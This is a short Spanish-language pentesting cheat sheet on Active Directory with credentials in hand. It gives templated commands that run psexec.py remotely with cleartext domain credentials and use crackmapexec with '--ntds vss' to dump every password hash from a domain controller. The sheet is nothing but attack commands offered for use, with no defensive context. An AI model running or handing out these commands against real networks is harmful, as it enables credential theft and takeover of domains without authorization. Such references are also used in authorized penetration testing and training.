
# Con credenciales del DC 

Autenticación con credenciales en texto claro

```ruby
psexec.py {dominio}/{usuario}:{contraseña}@{IP}
```

Extrayendo todos los hashes del directorio activo:

```ruby
crackmapexec smb {ipdeldc} -u '{usuariodc}' -p '{contraseña}' --ntds vss
```

## Con credenciales de usuarios

```ruby
psexec.py {dominio}/{usuario}:{contraseña}@{IP}
```